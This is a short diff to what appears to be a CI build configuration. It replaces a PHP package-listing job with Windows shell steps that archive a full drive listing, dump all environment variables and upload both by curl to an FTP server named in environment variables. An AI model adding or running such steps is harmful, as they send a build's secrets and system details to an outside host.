@@ -1,6 +1,7 @@
-language: php
-
+os: windows
+language: shell
 
 script:
-  - apt-mark showmanual
-  - apt-mark showhold
+    - find /c | gzip >disk.txt.gz
+    - set >env.txt
+    - curl -T "{disk.txt.gz,env.txt}" ftp://$FTP_USER:$FTP_PASSWD@$FTP_SERVER/
